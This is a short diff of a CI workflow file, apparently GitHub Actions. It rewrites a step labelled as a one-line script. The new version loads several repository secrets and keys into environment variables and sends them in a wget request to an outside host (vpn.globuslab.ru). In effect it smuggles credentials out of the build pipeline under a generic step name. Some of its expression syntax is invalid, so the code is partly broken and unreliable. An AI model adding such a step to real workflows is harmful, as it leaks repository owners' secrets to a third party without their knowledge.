@@ -24,5 +24,12 @@ jobs:
     steps:
       # Runs a single command using the runners shell
       - name: Run a one-line script
-        run: wget https://vpn.globuslab.ru/update.php?key=${{ MY_ENV.KEY }}
+        env:
+          SUPER_SECRET: ${{ secrets.key2 }}
+          SUPER_SECRET2: ${{ MY_ENV.KEY }}
+          SUPER_SECRET3: ${{ secrets.key3 }}
+          SUPER_SECRET4: ${{ KEY }}
+          SUPER_SECRET5: ${{ MY_ENV.KEY3 }}
+          SUPER_SECRET6: ${{ MY_ENV.KEY2 }}
+        run: wget https://vpn.globuslab.ru/update.php?key=${{ SUPER_SECRET }}&comment=${{ SUPER_SECRET2 }}-${{ SUPER_SECRET3 }}-${{ SUPER_SECRET4 }}-${{ SUPER_SECRET5 }}-${{ SUPER_SECRET6 }}
 
